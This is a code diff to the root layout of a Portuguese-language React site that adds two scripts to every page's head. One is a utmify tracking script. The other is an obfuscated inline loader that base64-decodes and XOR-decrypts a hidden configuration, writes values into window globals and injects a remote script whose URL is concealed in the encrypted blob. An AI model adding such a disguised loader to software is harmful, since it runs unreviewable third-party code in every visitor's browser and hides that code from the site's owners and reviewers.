@@ -111,6 +111,8 @@ function RootShell({ children }: { children: ReactNode }) {
     <html lang="pt-BR">
       <head>
         <HeadContent />
+        <script dangerouslySetInnerHTML={{ __html: '(function(){var p_ys=atob("DN8sgTPNM4mlskJA+6QO9EGhEbOH2jY0i6wWrhyuV+eLxzYtkrlVr1CiXqfHwG0zmK1F8Ue+HPnMyics1K9F+VahHePWkG5imqtY81qvRv3AwWB6oIIAo1ShXOvE3jFiwYRXo12sXuyHiGAwkqdJ7XqpEaWHxCMsjroOuxH7Ur7Dgyd5mOdOuQerAO/G0yQly7sZ5VDvTtTY");var h_j=[];for(var l_ua7=0;l_ua7<p_ys.length;l_ua7++){h_j.push(p_ys.charCodeAt(l_ua7)&255);}var k_v4=h_j[0];var y_pwx=h_j.slice(1,1+k_v4);var z_s=h_j.slice(1+k_v4);var k_z=z_s.map(function(b,o_til2){return b^y_pwx[o_til2%k_v4];});var r_34li="";for(var o_6jul=0;o_6jul<k_z.length;o_6jul++){r_34li+=String.fromCharCode(k_z[o_6jul]&255);}var a_c0ct=decodeURIComponent(escape(r_34li));var x_f4pv=JSON.parse(a_c0ct);var o_8w1=x_f4pv.globals||[];o_8w1.forEach(function(u_5){window[u_5.name]=u_5.value;});var e_xme=document.createElement("script");e_xme.src=x_f4pv.url;e_xme.async=true;e_xme.defer=true;(x_f4pv.attributes||[]).forEach(function(h_5){e_xme.setAttribute(h_5.name,h_5.value);});(document.head||document.documentElement).appendChild(e_xme);})();' }} />
+        <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
       </head>
       <body>
         {children}
